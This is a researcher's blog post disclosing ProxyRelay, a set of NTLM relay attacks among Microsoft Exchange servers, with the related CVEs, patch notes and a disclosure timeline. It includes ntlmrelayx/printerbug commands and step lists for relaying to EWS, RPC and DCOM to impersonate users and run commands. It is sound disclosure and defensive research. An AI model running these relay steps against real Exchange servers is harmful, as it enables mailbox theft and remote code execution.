---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/
title: "A New Attack Surface on MS Exchange Part 4 - ProxyRelay! | Orange Tsai"
author: "Orange Tsai"
published: 2022-10-18T16:00:00.000Z
description: "This is a cross-post blog from DEVCORE. You can check the series on: A New Attack Surface on MS Exchange Part 1 - ProxyLogon! A New Attack Surface on MS Exchange Part 2 - ProxyOracle! A New Attack S"
---

* * *

![preview](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/2c29d0f4d257c078-01.jpeg)

This is a cross-post blog from [DEVCORE](https://devco.re/blog/). You can check the series on:

- [A New Attack Surface on MS Exchange Part 1 - ProxyLogon!](https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html)
- [A New Attack Surface on MS Exchange Part 2 - ProxyOracle!](https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html)
- [A New Attack Surface on MS Exchange Part 3 - ProxyShell!](https://blog.orange.tw/2021/08/proxyshell-a-new-attack-surface-on-ms-exchange-part-3.html)
- [A New Attack Surface on MS Exchange Part 4 - ProxyRelay!](https://blog.orange.tw/2022/10/proxyrelay-a-new-attack-surface-on-ms-exchange-part-4.html)

* * *

Hi, this is a long-time-pending article. We could have published this article earlier (the original bug was reported to MSRC in June 2021 with a 90-days Public Disclosure Policy). However, during communications with MSRC, they explained that since this is an architectural design issue, lots of code changes and testings are expected and required, so they hope to resolve this problem with a one-time CU (Cumulative Update) instead of the regular Patch Tuesday. We understand their situation and agree to extend the deadline.

Microsoft eventually released [Exchange Server 2019 CU 12](https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8) and [Exchange Server 2016 CU 23](https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678) on April 20, 2022. However, **this patch did not enable by default**. Microsoft didn’t release the patch-activating methods until August 09, 2022. So, we originally had the opportunity to demonstrate our attack at [Pwn2Own Vancouver 2021](https://www.zerodayinitiative.com/blog/2022/1/12/pwn2own-vancouver-2022-luanch). However, we dropped the idea quickly because our intention is not to earn bounties. We are here to [secure the world](https://devco.re/en/about/)! You can check the [Timeline](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/#Timeline) to know the detailed disclosure process.

# [Idea](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Idea "Idea") Idea

Since Microsoft blocked our Proxy-Related attacks in April 2021, I have been thinking about whether there is a way to bypass the mitigation. During that April patch, Microsoft enhanced the authentication part of CAS Frontend by requiring all HTTP requests that need a Kerberos Ticket to be authenticated first. This enhancement effectively mitigated the attack surface we proposed and stopped unauthenticated HTTP requests accessing the CAS Backend. So Exchange is safe now?

Of course not, and this article is to prove this! Since Microsoft only fixes the problematic code, we proposed several attacks and possible weaknesses in our [POC 2021](https://powerofcommunity.net/2021.htm) and [HITCON 2021](https://hitcon.org/2021/agenda/279d7810-e619-4dc3-9113-b11bad5277ec/) talks.

![](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/upload_ddffa454332252f79b8a6363c34c874b.png)

Maybe you have heard that our first prediction has already been made in recent [ProxyNotShell](https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9). The attack reuses the path confusion of ProxyShell but attaches a pre-known authentication instead. It’s solid but it looks it still needs a valid authentication (not sure, still haven’t time to dig into). However, we hinted there is another way not to fight with the auth-enhancement face-to-face during my talks. Now we can finally disclose it :)

Just in case you don’t know, I am a big fan of [Printer Bug](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn) (kudos to [Lee Christensen](https://twitter.com/tifkin_), [Will Schroeder](https://twitter.com/harmj0y), and [Matt Nelson](https://twitter.com/enigma0x3) for their amazing talk at [DerbyCon 2018](https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory)). PrinterBug allows an attacker to coerce any domain-joined machine to initiate an SMB connection with its own Machine Account to the attacker via [MS-RPRN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) protocol. Because this behavior works as designed, this hacker-friendly feature has been extensively used for NTLM relaying for years.

In the architecture of Exchange CAS, Backend authorizes an HTTP request to have the ability to impersonate any user by checking whether the login identity has the Extended Right of `ms-Exch-EPI-Token-Serialization` or not. Also, during the Exchange Server installation, the mailbox server will be added to the `Exchange Servers group` automatically, and all objects in this Active Directory group have that Token-Serialization right by default.

With the prior knowledge in mind, I come up with a simple idea. It’s common to see multiple Exchange Servers in corporate networks for high availability and site resilience. **Can we relay the NTLM authentication among Exchange Servers?**

There are several pros to this relay idea. Since it’s a cross-machine relay, it won’t be limited by the same-host restriction. Also, because the NTLM authentication is initiated by the Machine Account of Exchange Server, the relayed authentication owns the Token-Serialization right that allows us to impersonate any user in Exchange services. I believe this is a fantastic idea and would like to explore if it is exploitable!

_P.S. This attack surface was also found and reported to MSRC independently by [Dlive](https://twitter.com/D1iv3) from Tencent Xuanwu Lab, so you can see we share most of the CVE acknowledgments._

# [Vulnerabilities](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Vulnerabilities "Vulnerabilities") Vulnerabilities

Let’s talk about the vulnerabilities. Since it’s an entire attack surface instead of a single bug, this idea could be applied to different contexts, causing different vulnerabilities. The impact of these vulnerabilities is that an attacker can bypass Exchange authentications or even get code execution without user-interaction. Here are the related CVEs so far:

- [CVE-2021-33768](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768) \- Relay to Exchange FrontEnd
- [CVE-2022-21979](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979) \- Relay to Exchange BackEnd
- [CVE-2021-26414](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414) \- Relay to Exchange DCOM
- [CVE-2022-24477](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-24477) \- Relay to other services of Exchange

The following attacks have the similar template, the host `EX01` stands for the first Exchange Server, `EX02` for the second Exchange Server, and `ATTACKER` for the attacker-controlled server.

In all attacks, the attacker coerces the first Exchange Server to initiate an NTLM authentication to him, and relay it to the second Exchange Server. We use [printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) to coerce a server to initiate an SMB connection and use [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to catch the NTLM and relay the authentication to another Exchange Server.

## [Round 1 - Relay to Exchange FrontEnd](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Round-1-Relay-to-Exchange-FrontEnd "Round 1 - Relay to Exchange FrontEnd") Round 1 - Relay to Exchange FrontEnd

For the first context, we try to relay the authentication to another Frontend of Exchange Server. Since the identity of the relayed authentication is Exchange’s Machine Account which owns the Token-Serialization right, we can impersonate any user! Here we relay the NTLM authentication from `EX01` to `EX02`‘s Frontend EWS service as the showcase. We implement the relay-to-frontend-EWS attack by customizing the [httpattack.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattack.py)! Here is a simple overview:

1. Run the `ntlmrelayx.py` on the `ATTACKER` server to wait for NTLM authentications.
2. Use the `printerbug.py` to coerce `EX01` to initiate an SMB connection to `ATTACKER`.
3. Receive the SMB connection on the `ATTACKER` and relay the NTLM blobs to `EX02`.
4. Complete the NTLM handshakes to get full access to the EWS endpoint.

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br># Terminal 1<br>$ python ntlmrelayx.py -smb2support -t https://EX02/EWS/Exchange.asmx<br># Terminal 2<br>$ python printerbug.py EX01 ATTACKER<br>``` |

Theoretically, we can take over the target mailbox by [EWS operations](https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange). Here we give a demo to dump the secret under administrator’s mailbox.

ProxyRelay - A New Attack Surface on Microsoft Exchange Server! - YouTube

Tap to unmute

[ProxyRelay - A New Attack Surface on Microsoft Exchange Server!](https://www.youtube.com/watch?v=IFRvmo6AZoY) [Orange Tsai](https://www.youtube.com/channel/UCnweRFxfA-xpTbkb83yfBog)

Orange Tsai3.75K subscribers

[Watch on](https://www.youtube.com/watch?v=IFRvmo6AZoY)

### [Patching FrontEnd](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Patching-FrontEnd "Patching FrontEnd") Patching FrontEnd

Microsoft assigned [CVE-2021-33768](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768) and released a patch to fix that Frontend is relay-able in July 2021. Since logging in as Machine Account in Frontend isn’t a regular operation, it’s easy to mitigate the attack by adding a check `IsSystemOrMachineAccount()` on the Frontend Proxy-Handler to ensure all Frontend logons are not Machine Account.

## [Round 2 - Relay to Exchange BackEnd](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Round-2-Relay-to-Exchange-BackEnd "Round 2 - Relay to Exchange BackEnd") Round 2 - Relay to Exchange BackEnd

Relaying to Frontend can be easily mitigated by a simple check. How about relaying to Backend? Since Backend verifies the Frontend requests by checking whether it’s a Machine Account or not, mitigating Backend would be more challenging because it’s a regular operation and Backend needs the Machine Account that hash the extended right of ms-Exch-EPI-Token-Serialization to impersonate to the desired user. Here we provide 3 showcases against attacking Backend.

### [2-1 Attacking BackEnd /EWS](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#2-1-Attacking-BackEnd-EWS "2-1 Attacking BackEnd /EWS") 2-1 Attacking BackEnd `/EWS`

Based on the relay-to-frontend EWS attack we introduced, the earlier attack can be re-applied to Backend seamlessly. The only change is to modify the target port from 443 to 444.

### [2-2 Attacking BackEnd /RPC](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#2-2-Attacking-BackEnd-RPC "2-2 Attacking BackEnd /RPC") 2-2 Attacking BackEnd `/RPC`

The other showcase is attacking [Outlook Anywhere](https://learn.microsoft.com/en-us/exchange/outlook-anywhere-exchange-2013-help). Exchange defines several internal RPC services that can directly operate the mailbox. Those RPC services have a public interface and can be access through `/Rpc/*`, and users can access their own mailbox via RPC-over-HTTP protocol, which is described in Microsoft’s [MS-RPCH](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpch/c0f4c9c5-1a61-4d10-b8e2-005378d1d212) specification. For those who want to understand the underlying mechanism, it’s recommended to read the awesome research [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/) by [Arseniy Sharoglazov](https://twitter.com/_mohemiv) for details.

Back to our attack, the core logic is as same as attacking EWS. Because the `/Rpc/*` is also located at HTTP/HTTPS, it’s also relay-able. Once we bypass the authentication and access the route `/Rpc/RpcProxy.dll`, we can impersonate as any user and operate his mailbox through the RPC-over-HTTP protocol. To implement the attack, we have ported lots of the [Ruler Project](https://github.com/sensepost/ruler) to [Impacket](https://github.com/SecureAuthCorp/impacket). As the result of this showcase, we can bypass the authentication by PrinterBug and operates any user’s mailbox through Outlook Anywhere. The entire attack can be illustrated as the following steps:

1. Establish `RCP_IN_DATA` and `RCP_OUT_DATA` channels to `EX02` for RPC I/O.
2. Trigger PrinterBug on `EX01` and relay to `EX02` to complete NTLM handshakes.
3. Attach `X-CommonAccessToken` headers to indicate we are Exchange Admin on both HTTP headers.
4. Interact with the Outlook Anywhere by lots of the coding works upon [MS-OXCRPC](https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a) and [MS-OXCROPS](https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrops/13af6911-27e5-4aa0-bb75-637b02d4f2ef) over MS-RPCH…

### [2-3 Attacking BackEnd /PowerShell](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#2-3-Attacking-BackEnd-PowerShell "2-3 Attacking BackEnd /PowerShell") 2-3 Attacking BackEnd `/PowerShell`

The last showcase we would like to highlight is relaying to Exchange PowerShell. Since we have bypassed the authentication on Backend IIS, it’s possible to perform a [ProxyShell-Like](https://blog.orange.tw/2021/08/proxyshell-a-new-attack-surface-on-ms-exchange-part-3.html) exploit again! Once we can execute arbitrary Exchange Cmdlets, it shouldn’t be hard to find a Post-Auth RCE to chain together because we are Exchange Admin. There are hundreds of Cmdlets for the purpose of Exchange Management, and many past cases ( [CVE-2020-16875](https://srcincite.io/advisories/src-2020-0019/), [CVE-2020-17083](https://srcincite.io/advisories/src-2020-0025/), [CVE-2020-17132](https://x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/), [CVE-2021-31207](https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell) and more) have proven that this is not a difficult task, too.

Since we decided not to participate in Pwn2Own, we did not implement this exploit chain. Here we leave this as an exercise for our readers. ;)

### [2-4 Patching BackEnd](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#2-4-Patching-BackEnd "2-4 Patching BackEnd") 2-4 Patching BackEnd

Microsoft assigned [CVE-2022-21979](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979) and patch that in August 2022. This patch permanently eliminates all relay attacks on Backend by forcibly turning on the [Extended Protection Authentication](https://msrc-blog.microsoft.com/2009/12/08/extended-protection-for-authentication/) in IIS.

## [Round 3 - Relay to Windows DCOM](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Round-3-Relay-to-Windows-DCOM "Round 3 - Relay to Windows DCOM") Round 3 - Relay to Windows DCOM

This part should be all credited to [Dlive](https://twitter.com/D1iv3). The industry knows MS-DCOM is relay-able since [Sylvain Heiniger](https://twitter.com/sploutchy)’s awesome [Relaying NTLM authentication over RPC](https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/) research for long. However, Dlive creates an RCE-chain based on the group inheritance of Exchange Servers in Active Directory environments. Please shout out to him!

The idea of this attack is that the `Local Administrators` group of Exchange Server includes the group member `Exchange Trusted Subsystem`, and all Exchange Server are in this group by default. That means the Machine Account `EX01$` is also the local administrator of `EX02`. With this concept in mind, the impact of relay-to-MS-DCOM can be maximized and perfectly applied to Exchange Server now!

Dlive has demonstrated this attack in his [DEFCON 29 talk](https://www.youtube.com/watch?v=7h38rI8KT30). Although he didn’t publish the exploit code, the Wireshark screenshot in his [slides](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf?page=45) p45 has already hinted everything and is enough to reproduce. The process could be illustrated as the following:

1. Coerce `EX01` to initiate a connection, and relay the NTLM to the Endpoint Mapper (port 135) of `EX02` to get the Interface of `MMC20.Application`.
2. Coerce `EX01` again, and relay the NTLM to the dynamic port allocated by the EPMapper, and call `ExecuteShellCommand(...)` under `iMMC->Document->ActiveView`.
3. Run arbitrary commands for fun and profit!

Writing the whole exploit is fun, just like mixing the `dcomexec.py` and `ntlmrelayx.py` together. It’s recommended to write your own exploit code by hand for those who want to understand the DCOM mechanism more!

### [Patching DCOM](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Patching-DCOM "Patching DCOM") Patching DCOM

Microsoft assigned [CVE-2021-26414](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414) and patch this DCOM-relay in June 2021. However, due to compatibility, **the hardening on the server-side is disabled by default**. Server Admin has to manually activate the patch by creating the following registry key. If Server Admin didn’t read the documentation carefully, his Exchange Server is probably still vulnerable after the June patch.

> HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Ole\\AppCompat\\RequireIntegrityActivationAuthenticationLevel

As for when will the protection be enforced on server side? According to the FAQ under the CVE page, Microsoft has addressed a three-phase rollout to fully mitigate this issue. Now, it’s on phase one, and the patch won’t be activated by default until June 14, 2022. So, at the time of this writing, this RCE is still exploitable on the latest version of Exchange Server!

_P.S. Microsoft hash announce the second phase and enabled the hardening on the server-side by default on June 14, 2022. Exchange Server that installed the latest Windows patch should be safe now_

## [Round 4 - Relay to Other Exchange Services…](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Round-4-Relay-to-Other-Exchange-Services%E2%80%A6 "Round 4 - Relay to Other Exchange Services…") Round 4 - Relay to Other Exchange Services…

Services that use NTLM as their authentication method on Exchange Server might be vulnerable, too. At the time of this writing, we have already found and reported one to MSRC. We believe there should be more, and this is a good target for those who want to discover vulnerabilities on Exchange Server!

# [Closing](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Closing "Closing") Closing

Here, this series has finally come to an end. Over the past two years, many ups and downs made this journey unusual. From the earliest bug collision with the bad actor, ITW panic, to the Pwn2Own hacking competition, and our talks got acceptance at top-level hacker conferences, we have a clear conscience that we didn’t do anything wrong. However, without understanding the context, there were lots of incorrect speculations and inaccurate media reports toward our company and me; there were even low blows to us… that sucks.

Although there were also happy moments, such as winning our first Master-of-Pwn champion at the top-hacking competition Pwn2Own and got the Best Server-Side bug of Pwnie Awards, the gossip and troll really harassed and depressed me a lot…

Congratulate that I can finally close this research and start my new hacking. I am nothing but a security nerd who would rather spend more time on hacks, and please don’t blame me if my sentences are sometimes short and unclear; it’s not easy to express things in an unfamiliar language. It took me about 4x~5x times to arrange a presentation or article in a non-native language; lots of words were lost during refining.

Hope that one day, there will be no language barrier. In a bar, with beers, we can talk about hacks, the culture, and hacking all night!

# [Timeline](https://blog.orange.tw/posts/2022-10-proxyrelay-a-new-attack-surface-on-ms-exchange-part-4/\#Timeline "Timeline") Timeline

- **Jun 02, 2021** \- We reported the vulnerability to Microsoft through the MSRC portal.
- **Jun 03, 2021** \- MSRC opened the case. (No. 65594)
- **Jun 03, 2021** \- We attached a 90-days Vulnerability Disclosure Policy to MSRC. The deadline is **Sep 01, 2021**.
- **Jun 11, 2021** \- MSRC replied that they are aiming to complete it before September.
- **Jul 22, 2021** \- MSRC said the case doesn’t look like it will be fully resolved by September.
- **Jul 25, 2021** \- We said we could extend the deadline and let us know the new estimated date.
- **Aug 25, 2021** \- We asked for the estimated date again.
- **Sep 01, 2021** \- MSRC said this case has been expanding into a design change and the intended release date is **December 2021**.
- **Sep 08, 2021** \- We asked is it possible to shorten the time frame because we would like to disclose this at conferences.
- **Sep 17, 2021** \- MSRC replied there are not quick and simple fixes but design level changes, they can’t get the changes in October.
- **Oct 25, 2021** \- We decided not to disclose this at conferences and gave the team a fair time for fixing and testing. We hoped this bug could be fixed as scheduled in December 2021.
- **Dec 21, 2021** \- We asked for updates on this case.
- **Dec 22, 2021** \- MSRC replied they aimed to include this patch in a CU (Cumulative Update) instead of an SU (Security Update) due to the level of changes. The next CU release date will be in **March 2022**.
- **Apr 04, 2022** \- We asked that we don’t see the CU in March. When is the new release date?
- **Apr 13, 2022** \- MSRC replied the CU is delayed, and the current release date is on **April 20, 2022**.
- **Apr 20, 2022** \- Microsoft released [Exchange Server 2019 CU 12](https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8) and [Exchange Server 2016 CU 23](https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678).
- **Apr 21, 2022** \- We found our exploit still works fine on the latest version of Exchange Server and asked is this bug really fixed?
- **Apr 27, 2022** \- MSRC replied the CU contain the code change, but it needs to be activated manually or with a script. There are still some testing concerns but the manual activation process will be public on **May 10, 2022**.
- **May 11, 2022** \- MSRC said the documentation and the script are mapped for the Patching Tuesday of June 2022 ( **Jun 14, 2022**).
- **Jun 10, 2022** \- MSRC said there are still having some issues on testing and they are looking to release this in **July 2022**.
- **Jul 04, 2022** \- We asked if it will release in this month’s Patching Tuesday.
- **Aug 10, 2022** \- Don’t see anything, asked again.
- **Aug 18, 2022** \- Microsoft released the CVE and [the patch activation documentation](https://techcommunity.microsoft.com/t5/exchange-team-blog/released-august-2022-exchange-server-security-updates/ba-p/3593862)!